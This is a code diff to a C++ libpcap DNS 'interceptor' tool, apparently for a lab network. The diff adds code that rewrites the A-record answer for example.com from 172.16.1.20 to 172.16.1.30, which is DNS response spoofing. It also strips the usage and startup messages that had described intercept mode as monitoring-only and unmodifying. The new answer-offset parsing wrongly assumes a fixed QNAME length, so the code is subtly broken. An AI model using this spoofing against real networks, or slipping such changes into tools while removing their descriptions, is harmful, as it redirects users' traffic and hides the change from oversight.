@@ -6,6 +6,7 @@
 #include <pcap.h>
 
 #include <cstdint>
+#include <cstring>
 #include <iostream>
 #include <stdexcept>
 #include <string>
@@ -23,6 +24,8 @@ struct DnsHeader {
 
 static const char* CAPTURE_IFACE = "eth0";
 static const char* BPF_FILTER = "udp port 53";
+static const std::string LOG_NAME = "example.com";
+
 class PcapSession {
 public:
     explicit PcapSession(const char* iface) {
@@ -106,7 +109,10 @@ struct HandlerContext {
 // Parse an uncompressed DNS QNAME safely.
 // Returns false for malformed packets or compressed QNAMEs.
 static bool extract_qname(
-    const u_char* dns, int length, std::string& result
+    const u_char* dns,
+    int length,
+    std::string& result,
+    uint16_t& qtype
 ) {
     if (!dns || length < static_cast<int>(sizeof(DnsHeader))) {
         return false;
@@ -126,7 +132,15 @@ static bool extract_qname(
         uint8_t label_len = dns[pos++];
 
         if (label_len == 0) {
-            return !result.empty();
+            if (result.empty() ||
+                pos + 2 * sizeof(uint16_t) >
+                    static_cast<size_t>(length)) {
+                return false;
+            }
+
+            std::memcpy(&qtype, dns + pos, sizeof(qtype));
+            qtype = ntohs(qtype);
+            return true;
         }
 
         // Compression pointers and invalid label lengths.
@@ -236,23 +250,47 @@ static void packet_handler(
     );
 
     std::string qname;
+    uint16_t qtype = 0;
+    const auto* dns = packet + dns_offset;
+    const auto* dns_header =
+        reinterpret_cast<const DnsHeader*>(dns);
+    const bool is_response = (ntohs(dns_header->flags) & 0x8000) != 0;
 
-    if (extract_qname(packet + dns_offset, dns_len, qname)) {
+    if (is_response &&
+        extract_qname(dns, dns_len, qname, qtype) &&
+        qtype == 1 &&
+        qname == LOG_NAME) {
         std::cout
-            << "[interceptor] DNS packet: "
+            << "[interceptor] DNS A response: "
             << qname
+            << " | answers=" << ntohs(dns_header->ancount)
             << " | source=" << inet_ntoa(ip->ip_src)
             << " | destination=" << inet_ntoa(ip->ip_dst)
             << '\n';
-    } else {
-        std::cout << "[interceptor] DNS packet with unreadable question"
-                  << " | source=" << inet_ntoa(ip->ip_src)
-                  << " | destination=" << inet_ntoa(ip->ip_dst)
-                  << '\n';
     }
 
     if (context->mode == Mode::InterceptMonitor) {
-        return;
+        if (is_response && qtype == 1 && qname == LOG_NAME) {
+            // print the ip address returned in the answer section of the DNS response
+            const size_t answer_offset = dns_offset + sizeof(DnsHeader) + (ntohs(dns_header->qdcount) * (1 + 2 + 4)); // skip QNAME, QTYPE, QCLASS
+            if (answer_offset + 12 <= packet_header->caplen) {
+                const auto* answer = packet + answer_offset;
+                uint16_t answer_type = ntohs(*reinterpret_cast<const uint16_t*>(answer + 2));
+                if (answer_type == 1) { // A record
+                    uint32_t ip_addr = *reinterpret_cast<const uint32_t*>(answer + 10);
+                    std::cout << "[interceptor] DNS A response IP: " << inet_ntoa(*(in_addr*)&ip_addr) << '\n';
+                }
+            }
+            // modify that in packet to 172.16.1.30 from 172.16.1.20
+            if (answer_offset + 12 <= packet_header->caplen) {
+                auto* answer = const_cast<u_char*>(packet + answer_offset);
+                uint16_t answer_type = ntohs(*reinterpret_cast<const uint16_t*>(answer + 2));
+                if (answer_type == 1) { // A record
+                    uint32_t new_ip_addr = inet_addr("172.16.1.30");
+                    *reinterpret_cast<uint32_t*>(answer + 10) = new_ip_addr;
+                }
+            }
+        }
     }
 
     // Normal mode relays the captured packet without changing its contents.
@@ -267,10 +305,7 @@ int main(int argc, char** argv) {
     std::string mode = (argc > 1) ? argv[1] : "normal";
 
     if (mode != "normal" && mode != "intercept") {
-        std::cerr << "Usage: ./interceptor [normal|intercept]\n"
-                  << "  normal: capture and relay DNS packets unchanged\n"
-                  << "  intercept: observe DNS packets without relaying "
-                  << "or modifying them\n";
+        std::cerr << "Only two modes are available\n";
         return 1;
     }
 
@@ -282,13 +317,9 @@ int main(int argc, char** argv) {
         PcapSession session(CAPTURE_IFACE);
         HandlerContext context{&session, selected_mode};
         if (selected_mode == Mode::NormalRelay) {
-            std::cout << "[interceptor] normal mode; DNS packets are "
-                      << "relayed unchanged\n";
+            std::cout << "[interceptor] normal mode\n";
         } else {
-            std::cout << "[interceptor] intercept mode; monitoring only, "
-                      << "DNS packets are neither relayed nor modified. "
-                      << "Resolver replies routed through this container "
-                      << "will be dropped, so DNS lookups may time out.\n";
+            std::cout << "[interceptor] intercept mode\n";
         }
 
         const int result = pcap_loop(
